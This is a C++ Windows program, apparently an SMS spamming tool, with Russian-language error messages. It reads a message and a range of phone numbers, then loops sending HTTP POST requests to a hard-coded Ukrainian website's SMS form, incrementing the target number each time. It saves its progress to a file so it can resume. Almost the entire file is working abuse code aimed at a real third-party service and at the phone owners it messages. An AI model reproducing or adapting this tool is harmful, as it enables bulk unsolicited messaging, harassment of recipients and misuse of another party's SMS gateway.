#include <iostream.h>
#include <stdio.h>
#include <winsock2.h>
#include <ras.h>
#include <raserror.h>

bool InternetConnected ()
{
	DWORD	nRasDevices = 20;
	DWORD	nSize = 20;
	RASCONN rasconnected [10];  

	rasconnected[0].dwSize = sizeof(RASCONN);
	RasEnumConnections( rasconnected, &nSize, &nRasDevices );

    return ( BOOL (nRasDevices) );
}

void observer(char * msg)
{
	char* buffer;
	long  size=strlen(msg);	

	buffer=new char[size+1];
	strcpy(buffer,msg);
	cout <<buffer<<endl;

	delete[] buffer;
}

void LoadFile(char * path,void * data)
{
	HANDLE		hFile;
	DWORD		bRead;

	hFile=CreateFile((LPCSTR)path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
	if(hFile==INVALID_HANDLE_VALUE)
	{
		observer("в функций CreateFile() невозможно создать дескриптор файл!");
	}
	ReadFile(hFile,data,GetFileSize(hFile,NULL),&bRead,NULL);
	
	CloseHandle(hFile);
}

void SaveFile(char * path, void * data,DWORD size)
{
	HANDLE		hFile;
	DWORD		bWrite;

	hFile=CreateFile((LPCSTR)path,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
	if(hFile==INVALID_HANDLE_VALUE)
	{
		observer("в функций CreateFile() невозможно записать временный файл!");
	}

	WriteFile(hFile,data,size,&bWrite,NULL);

	CloseHandle(hFile);
}
 
void main()
{	
	WSADATA			wsaData;
	SOCKET			sock;
	SOCKADDR_IN		addr;
	hostent*		hp; 

	int  phone=2888729;
	int  limit=2888729;
	char buffer[32];

	char request[1024];
	char content_length[32];
	char command[512];
	char msg[256];

	ZeroMemory(&request,1024);
	ZeroMemory(&content_length,32);
	ZeroMemory(&command,512);
	ZeroMemory(&msg,256);

	LoadFile("phone.dat",&phone);
	wsprintf(buffer,"last number (%d)",phone);
	observer(buffer);

	cout <<"phone1:"; cin >>phone;
	cout <<"phone2:"; cin >>limit;

	LoadFile("msg.txt",&msg);

	if (InternetConnected())
	{
		WSAStartup(MAKEWORD(2,2), &wsaData);

		hp = gethostbyname("212.113.36.204");
		if (hp==NULL)
		{
			observer("Error get host name...");
		}

		memcpy(&(addr.sin_addr),hp->h_addr,hp->h_length);
		addr.sin_family=hp->h_addrtype;
		addr.sin_port= htons(80);

		while (true)
		{
			wsprintf(buffer,"#%d",phone);
			observer(buffer);

			wsprintf(command,"cmdSend=sent&Message=%s&network1=JEANS&Phone1=%d&=\r\n",msg,phone++);
			wsprintf(content_length,"Content-Length: %d\r\n",strlen(command));

			strcpy(request, "POST /ukr/sms.php? HTTP/1.0\r\n");
			strcat(request,	"Host: www.jeans.com.ua\r\n");
			strcat(request,	"User-Agent: Mozilla/3.0 (Compatible);metlinskiy@ua.fm\r\n");
			strcat(request,	"Accept: Text/*, */*\r\n");
			strcat(request,	"Content-Type: application/x-www-form-urlencoded\r\n");
			strcat(request,	"Referer:\r\n");
			strcat(request,	"Connection: keep-alive\r\n");
			strcat(request,	 content_length);
			strcat(request,	"\r\n");
			strcat(request,	 command);

			SaveFile("phone.dat",&phone,sizeof(phone));

			sock = socket (AF_INET ,SOCK_STREAM,0);
			if(sock==INVALID_SOCKET) 
			{
				observer("Error soket create...");
				break;
			}

			if (connect(sock,(struct sockaddr*)&addr, sizeof(addr))==SOCKET_ERROR)
			{
				observer("Server connected feild...");
				break;
			}

			send(sock,request,strlen(request),0);
			closesocket(sock);

			if (phone > limit )
			{
				break;
			}
		}

	}
	else
	{
		observer("Internet connected feild...");
	}
	getchar();
}
